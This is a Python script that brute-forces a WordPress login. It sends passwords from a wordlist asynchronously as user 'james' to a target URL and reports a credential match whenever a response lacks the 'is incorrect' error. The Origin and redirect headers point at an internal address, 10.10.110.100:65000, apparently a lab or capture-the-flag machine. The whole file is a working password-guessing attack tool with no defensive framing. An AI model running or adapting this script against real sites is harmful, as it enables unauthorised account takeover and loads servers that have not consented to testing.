import asyncio
import aiohttp
import re
import sys

URL = sys.argv[1]
PASS_FILE = sys.argv[2]
MIN_CONCURRENT_REQUESTS = 30
MAX_CONCURRENT_REQUESTS = 50

async def forge_post(session, url, password):
    headers = {
        "User-Agent" : "iamjonny the tester",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://10.10.110.100:65000",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1"
    }

    cookies = {
        "wordpress_test_cookie":"WP Cookie check"
    }

    payload ={
        "log" : "james",
        "pwd" :  password,
        "wp-submit":"Log In",
        "redirect_to" : "http://10.10.110.100:65000/wordpress/wp-admin/",
        "testcookie" : 1
    }

    async with session.post(url, headers=headers, data=payload, cookies=cookies) as resp:
        return await resp.text()

async def analyze_resp(resp):
    fail_match = re.search(r'is incorrect', resp)
    if fail_match is not None:
        return False
    else:
        return True

async def process_passwords(passwords):
    sem = asyncio.Semaphore(MIN_CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for password in passwords:
            password = password.strip()
            async with sem:
                tasks.append(forge_post(session, URL, password))
        results = await asyncio.gather(*tasks)
        for password, result in zip(passwords, results):
            pass_match = await analyze_resp(result)
            if pass_match:
                print("[+] Credential match!")
                print(f"{password.strip()}")

def main():
    passwords = []
    with open(PASS_FILE, "r") as f:
        passwords = f.readlines()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(process_passwords(passwords))
    loop.close()

if __name__ == "__main__":
    main()
